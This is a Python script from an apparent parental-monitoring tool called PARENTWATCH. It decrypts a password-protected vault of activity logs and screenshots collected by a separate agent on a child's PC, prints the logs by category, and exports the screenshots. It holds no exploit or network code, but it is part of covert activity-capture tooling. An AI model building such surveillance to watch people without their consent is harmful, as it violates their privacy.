# read_vault.py — run this on the child's PC to read all stored logs
# Usage: python read_vault.py
# Or compile separately: pyinstaller --onefile --name vault_reader read_vault.py

import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pathlib import Path
from vault.vault_manager import init_vault, vault_read_all, vault_read_screenshot
import config


def main():
    print("=" * 60)
    print("  PARENTWATCH — VAULT READER")
    print("=" * 60)

    password = input("\nEnter vault password: ").strip()

    vault_dir = config.VAULT_DIR
    if not vault_dir.exists():
        print("\n[!] Vault not found. Agent may not have run yet.")
        input("Press Enter to exit.")
        return

    try:
        key = init_vault(vault_dir, password)
    except Exception as e:
        print(f"\n[!] Failed to open vault: {e}")
        input("Press Enter to exit.")
        return

    entries = vault_read_all(vault_dir, key)

    if not entries:
        print("\n[!] Vault is empty.")
        input("Press Enter to exit.")
        return

    print(f"\n[+] Found {len(entries)} entries.\n")
    print("-" * 60)

    # Group by category
    categories = {}
    for e in entries:
        cat = e["category"]
        categories.setdefault(cat, []).append(e)

    for cat, items in categories.items():
        print(f"\n{'='*60}")
        print(f"  CATEGORY: {cat.upper()}  ({len(items)} entries)")
        print(f"{'='*60}")
        for item in items:
            print(f"\n[{item['ts']}]")
            print(item["text"])
            print("-" * 40)

    # List screenshots
    ss_dir = vault_dir / "ss"
    if ss_dir.exists():
        enc_files = list(ss_dir.glob("*.enc"))
        print(f"\n[+] Screenshots stored: {len(enc_files)}")
        if enc_files:
            export = input("\nExport screenshots to Desktop? (y/n): ").strip().lower()
            if export == "y":
                desktop = Path(os.environ.get("USERPROFILE", ".")) / "Desktop" / "vault_screenshots"
                desktop.mkdir(parents=True, exist_ok=True)
                for f in enc_files:
                    try:
                        png = vault_read_screenshot(vault_dir, key, str(f))
                        out = desktop / (f.stem + ".png")
                        out.write_bytes(png)
                        print(f"  Saved: {out.name}")
                    except Exception as ex:
                        print(f"  Failed: {f.name} — {ex}")
                print(f"\n[+] Screenshots saved to: {desktop}")

    print("\n" + "=" * 60)
    input("Done. Press Enter to exit.")


if __name__ == "__main__":
    main()
